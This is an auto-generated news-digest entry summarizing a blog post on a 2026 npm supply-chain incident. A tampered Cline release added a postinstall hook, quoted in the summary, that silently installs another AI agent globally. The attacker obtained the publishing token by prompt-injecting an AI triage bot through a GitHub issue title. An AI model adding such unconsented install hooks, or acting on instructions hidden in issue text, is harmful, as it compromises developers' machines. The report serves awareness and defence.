# A GitHub Issue Title Compromised 4k Developer Machines

- **Source:** Hacker News
- **Rank (today):** #1
- **Ranking metrics:** HN score 524
- **Published (UTC):** 2026-03-05 16:22
- **Original:** https://grith.ai/blog/clinejection-when-your-ai-tool-installs-another

## Summary

A GitHub Issue Title Compromised 4,000 Developer Machines On February 17, 2026, someone published cline@2.3.0 to npm. The CLI binary was byte-identical to the previous version. The only change was one line in package.json : "postinstall": "npm install -g openclaw@latest" For the next eight hours, every developer who installed or updated Cline got OpenClaw - a separate AI agent with full system access - installed globally on their machine without consent.

## Key Takeaways

- Approximately 4,000 downloads occurred before the package was pulled1.
- The interesting part is not the payload.
- It is how the attacker got the npm token in the first place: by injecting a prompt into a GitHub issue title, which an AI triage bot read, interpreted as an instruction, and executed.

---
_Auto-generated daily digest entry._
